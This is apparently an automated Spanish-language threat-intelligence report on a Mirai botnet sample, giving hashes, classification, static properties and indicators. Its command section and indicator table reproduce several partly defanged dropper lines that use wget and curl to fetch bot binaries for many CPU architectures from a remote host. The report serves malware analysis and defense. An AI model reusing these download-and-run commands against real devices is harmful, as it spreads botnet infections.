# 🧬 Payload Analysis

`039a321462f98c9bb5e0ff6adf523fe8e28e87c36c3aa90b4192a6b1598386fc`

## 📌 Resumen

Artefacto asociado a la familia **mirai** con evidencia suficiente para atribución. Comportamientos destacados: Descarga remota. Se identificaron 14 comandos observados o extraídos. Se identificaron 29 indicadores técnicos. **Ficha malware:** [malware-like/oraculo/botnet/039a321462f98c9bb5e0ff6adf523fe8e28e87c36c3aa90b4192a6b1598386fc.md](../../../../../malware-like/oraculo/botnet/039a321462f98c9bb5e0ff6adf523fe8e28e87c36c3aa90b4192a6b1598386fc.md)


## 🏷️ Clasificación

- **Categoría:** `Botnet`
- **Familia:** `mirai`
- **Confianza de familia:** `Media`
- **Riesgo:** `Critical`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:41:46.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `039a321462f98c9bb5e0ff6adf523fe8e28e87c36c3aa90b4192a6b1598386fc`
- **MD5:** `230636aeaa8dacf3992cb5b7ec49dc9c`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF, LF line terminators |
| Tamaño | 4.0 KiB |
| Entropía | 4.44 |
| Strings | 33 |

## 🧠 Comportamiento observado

1. **Descarga remota**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF, LF line terminators; iocs=10

## 🖥️ Comandos observados / extraídos

```text
wget hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnaarch64xnxn; curl -O hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnaarch64x
wget hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxni386xnxn; curl -O hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxni386xnxn; c
wget hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnloongarch64xnxn; curl -O hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnloon
wget hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnm68kxnxn; curl -O hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnm68kxnxn; c
wget hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnmicroblazexnxn; curl -O hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnmicro
wget hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnmipsxnxn; curl -O hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnmipsxnxn; c
wget hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnor1kxnxn; curl -O hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnor1kxnxn; c
wget hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnpowerpcxnxn; curl -O hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnpowerpcx
wget hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnriscv32xnxn; curl -O hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnriscv32x
wget hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnriscv64xnxn; curl -O hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnriscv64x
wget hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnsh2xnxn; curl -O hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnsh2xnxn; chm
wget hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnsh4xnxn; curl -O hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnsh4xnxn; chm
wget hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnx86_64xnxn; curl -O hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnx86_64xnx
wget hxxp://41.216.189.XXX/bins/xnxn
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnx86_64xnxn; | strings |
| url | hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnriscv32xnxn; | strings |
| url | hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnm68kxnxn; | strings |
| url | hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnmipsxnxn; | strings |
| url | hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnaarch64xnxn; | strings |
| url | hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnriscv64xnxn; | strings |
| url | hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnpowerpcxnxn; | strings |
| url | hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnsh2xnxn; | strings |
| url | hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnor1kxnxn; | strings |
| url | hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnsh4xnxn; | strings |
| url | hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnmicroblazexnxn; | strings |
| url | hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxni386xnxn; | strings |
| url | hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnloongarch64xnxn; | strings |
| url | hxxp://41.216.189.XXX/bins/xnxn | strings |
| ip | 41.216.189.XXX | static_analysis |
| command | wget hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnaarch64xnxn; curl -O hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnaarch64x | strings |
| command | wget hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxni386xnxn; curl -O hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxni386xnxn; c | strings |
| command | wget hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnloongarch64xnxn; curl -O hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnloon | strings |
| command | wget hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnm68kxnxn; curl -O hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnm68kxnxn; c | strings |
| command | wget hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnmicroblazexnxn; curl -O hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnmicro | strings |
| command | wget hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnmipsxnxn; curl -O hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnmipsxnxn; c | strings |
| command | wget hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnor1kxnxn; curl -O hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnor1kxnxn; c | strings |
| command | wget hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnpowerpcxnxn; curl -O hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnpowerpcx | strings |
| command | wget hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnriscv32xnxn; curl -O hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnriscv32x | strings |
| command | wget hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnriscv64xnxn; curl -O hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnriscv64x | strings |
| command | wget hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnsh2xnxn; curl -O hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnsh2xnxn; chm | strings |
| command | wget hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnsh4xnxn; curl -O hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnsh4xnxn; chm | strings |
| command | wget hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnx86_64xnxn; curl -O hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnx86_64xnx | strings |
| command | wget hxxp://41.216.189.XXX/bins/xnxn | strings |
| hash | 039a321462f98c9bb5e0ff6adf523fe8e28e87c36c3aa90b4192a6b1598386fc | static_analysis |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
